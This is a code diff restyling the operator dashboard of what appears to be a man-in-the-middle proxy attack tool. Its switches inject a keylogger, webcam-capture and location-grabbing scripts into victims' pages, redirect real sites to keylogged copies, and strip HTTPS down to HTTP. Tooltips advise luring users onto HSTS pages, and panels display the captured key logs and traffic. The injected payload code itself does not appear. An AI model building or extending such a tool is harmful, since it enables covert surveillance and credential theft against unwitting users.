@@ -12,67 +12,158 @@
     </div>
   </div>
 </header>
-  <div class="col-md-12">
-    <div class="btn-group col-md-6">
-      <div class="btn-primary">Proxy Controls</div>
-      <button class="toplevel btn btn-default" id="passthrough" title="This will allow all connections through, however the requests and responses will be stored as HAR files and any body that is sent with the request can be viewed in the HAR viewer below.">Simple Proxy</button>
-
-
-        <button class="toplevel btn btn-default" type="button" id="replaceImages" title="this currently does not work"><s>Replace All Images</s></button>
-        <button class="toplevel btn btn-default" type="button" id="flipImages" title="this currently does not work"><s>Flip Images</s></button>
-        <button class="toplevel btn btn-default" type="button" id="redirect" title="This will check if the site is in the array of sites to redirect, and if so will redirect to a local page with the same name i.e ft.com will get redirected to ft.html - NOTE: All redirected pages have the key logger automatically injected into them.">Redirect URLs</button>
-        <button class="toplevel btn btn-default" type="button" id="block" title="This will block sites that are in the list of sites to block however it cannot handle HSTS ">Block URLs</button>
-        <div class="btn-group">
-          <button type="button" class="toplevel btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="See the tool tips of the children of this. Different scripts for different injections. All scripts get an automatic jquery injection">
-          Inject Hook in HTTP <span class="caret"></span>
-          </button>
-          <ul class="dropdown-menu" role="menu">
-            <div class="btn-group">
-            <button class="btn btn-default" id="keylogger" title="This will inject a keylogger into the page if it can (i.e HTTP).">keylogger</button>
-            <button class="btn btn-default" id="takePhoto" title="This will inject a script to attempt to take a photo with the web cam on the clients computer">Take Photo</button>
-            <button class="btn btn-default" id="getLocation" title="This will inject a script to attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.">Get Location</button>
-            <button class="btn btn-default" id="requestLogin" title="This will inject a script to attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.">Request User Login</button>
-            <button id="" class="btn btn-info disabled">Add more here</button>
+<div class="main">
+  <section class="col-md-4 proxy-controls">
+    <div class="panel panel-default">
+      <!-- Default panel contents -->
+      <div class="panel-heading">Proxy Controls</div>
+      <!-- <div class="panel-body">
+        <small>Configure your smallroxy. Checked Setting will be activated.</small>
+      </div>
+ -->
+      <!-- List group -->
+      <ul class="list-group">
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="passthrough" class="onoffswitch-checkbox" id="passthrough">
+            <label class="onoffswitch-label" for="passthrough">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
           </div>
+          <h4>Simple Proxy</h4>
+          <small>Allow all connections through, however the requests and responses will be stored as HAR files and any body that is sent with the request can be viewed in the HAR viewer below.</small>
+        </li>
+
+        <li class="list-group-item" id="replaceImages" title="this currently does not work"><s>Replace All Images</s></li>
+        <li class="list-group-item" id="flipImages" title="this currently does not work"><s>Flip Images</s></li>
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="redirect" class="onoffswitch-checkbox" id="redirect">
+            <label class="onoffswitch-label" for="redirect">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Redirect URLs</h4>
+          <small>Check if the site is in the array of sites to redirect, and if so will redirect to a local page with the same name i.e ft.com will get redirected to ft.html - NOTE: All redirected pages have the key logger automatically injected into them.</small>
+        </li>
+
+        <li class="list-group-item">
+          <div class="onoffswitch">
+            <input type="checkbox" name="block" class="onoffswitch-checkbox" id="block">
+            <label class="onoffswitch-label" for="block">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Block URLs</h4>
+          <small>Block sites that are in the list of sites to block however it cannot handle HSTS.</small>
+        </li>
+        <li class="list-group-item list-group-item-toggle dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
+          <a data-toggle="collapse" href="#collapseInject" aria-expanded="true" aria-controls="collapseInject"><h4>Inject Hook in HTTP <span class="caret"></span></h4>
+          <small>Different scripts for different injections. All scripts get an automatic jquery injection.</small>
+          </a>
+          <ul class="list-group collapse" id="collapseInject">
+
+            <li class="list-group-item" title="This will inject a keylogger into the page if it can (i.e HTTP).">
+              <div class="onoffswitch">
+                <input type="checkbox" name="keylogger" class="onoffswitch-checkbox" id="keylogger">
+                <label class="onoffswitch-label" for="keylogger">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Keylogger</h4>
+              <small>Inject a keylogger into the page if it can (i.e HTTP)</small>
+            </li>
+
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="takePhoto" class="onoffswitch-checkbox" id="takePhoto">
+                <label class="onoffswitch-label" for="takePhoto">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Take Photo</h4>
+              <small>Attempt to take a photo with the web cam on the clients computer</small>
+            </li>
+
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="getLocation" class="onoffswitch-checkbox" id="getLocation">
+                <label class="onoffswitch-label" for="getLocation">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Get Location</h4>
+              <small>Attempt to get the user's location It will try and use the users public IP aswell as request them to give up their location more accurately.</small>
+            </li>
+
+            <li class="list-group-item">
+              <div class="onoffswitch">
+                <input type="checkbox" name="requestLogin" class="onoffswitch-checkbox" id="requestLogin">
+                <label class="onoffswitch-label" for="requestLogin">
+                  <span class="onoffswitch-inner"></span>
+                  <span class="onoffswitch-switch"></span>
+                </label>
+              </div>
+              <h4>Request User Location</h4>
+              <small>It will try and use the users public IP aswell as request them to give up their location more accurately.</small>
+            </li>
           </ul>
-        </div>
-        <button class="toplevel btn btn-default" type="button" id="intercept" 
-        title="This will attempt to stop the clients request and make the same request itself. It will then pass the response from the server back to the client, but over HTTP. If it experiences HSTS then it will block the request. It is recommended to try and get the user to click on links to pages that are HSTS where possible.">Wolf Pack Hack</button>
+        <li class="list-group-item">
+        <div class="onoffswitch">
+            <input type="checkbox" name="intercept" class="onoffswitch-checkbox" id="intercept">
+            <label class="onoffswitch-label" for="intercept">
+              <span class="onoffswitch-inner"></span>
+              <span class="onoffswitch-switch"></span>
+            </label>
+          </div>
+          <h4>Wolf Pack Hack</h4>
+          <small>This will attempt to stop the clients request and make the same request itself. It will then pass the response from the server back to the client, but over HTTP. If it experiences HSTS then it will block the request. It is recommended to try and get the user to click on links to pages that are HSTS where possible.</small>
+        </li>
+      </ul>
     </div>
-    <div class="btn-group col-md-6">
-      <div class="btn-primary">Dashboard</div>
-        <div class="btn-group">
-          <button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="See the hars collected for each client">
-          View Hars <span class="caret"></span>
-          </button>
-          <ul class="dropdown-menu" role="menu">
-            <button class="btn btn-info" id="gethars">Get Hars</button>
-            <button class="btn btn-danger" id="deletehars">Delete current data</button>
-            <div class="btn-group" id="clients">
-            </div>
-          </ul>
-        </div>
-        <button id="getKeyLogs" class="btn btn-default">View Key logging</button>
-        <button id="getWifi" class="btn btn-default" title="this is to discover the SSIDs that devices are trying to connect to. Useful for creating hotspots for targetted attacks"><s>Discover Local Wifi Requests</s></button>
-        
-        <div class="btn-group">
-          <button id="createAccessPoint" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="Create an access point"><s>Create access point</s><span class="caret"></span>
-          </button>
-          <ul class="dropdown-menu">
-            <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
+  </section>
+  <section class="col-md-8">
+      <div class="btn-group">
+        <div class="btn-primary">Dashboard</div>
+          <div class="btn-group">
+            <button class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="See the hars collected for each client">
+            View Hars <span class="caret"></span>
+            </button>
+            <ul class="dropdown-menu" role="menu">
+              <button class="btn btn-info" id="gethars">Get Hars</button>
+              <button class="btn btn-danger" id="deletehars">Delete current data</button>
+              <div class="btn-group" id="clients">
+              </div>
+            </ul>
+          </div>
+          <button id="getKeyLogs" class="btn btn-default">View Key logging</button>
+          <button id="getWifi" class="btn btn-default" title="this is to discover the SSIDs that devices are trying to connect to. Useful for creating hotspots for targetted attacks"><s>Discover Local Wifi Requests</s></button>
 
-          </ul>
-        </div>
+          <div class="btn-group">
+            <button id="createAccessPoint" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-expanded="false" title="Create an access point"><s>Create access point</s><span class="caret"></span>
+            </button>
+            <ul class="dropdown-menu">
+              <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
 
-    </div>
-  </div>
-    <div class="col-md-4"><h2>Key logs</h2></div>
-    <div class="col-md-8"><h2>Har viewer</h2></div>
-    <div class="col-md-4" id='userLogs'></div>  
-    <div class="col-md-8" id='har-view'></div> <!-- har viewer here -->
-    <div class="col-md-12"><h2><s>Wifi Requests</s></h2></div>
-    <div class="col-md-12" id='wifi-requests'></div> <!-- har viewer here -->
+            </ul>
+          </div>
+      </div> <!-- end button-group -->
 
+      <div class="col-md-4"><h2>Key logs</h2></div>
+      <div class="col-md-8"><h2>Har viewer</h2></div>
+      <div class="col-md-4" id='userLogs'></div>
+      <div class="col-md-8" id='har-view'></div> <!-- har viewer here -->
+      <div class="col-md-12"><h2><s>Wifi Requests</s></h2></div>
+      <div class="col-md-12" id='wifi-requests'></div> <!-- har viewer here -->
+
+  </section>
+</div>
 <script type="text/javascript">
 
   $(".toplevel").click(function() {
@@ -152,11 +243,11 @@
             $('#userLogs').append("<p>"+j.Page)
             $('#userLogs').append(j.Content)
           }
-          lastURL = j.Page          
+          lastURL = j.Page
         })
-        
+
       })
-      
+
   })
   //get the hars that have been collected
   //update for each connected client
@@ -172,7 +263,7 @@
             har.render(data);
         });
       })
-      $("#clients").append(listItem) 
+      $("#clients").append(listItem)
     })
   })
   })
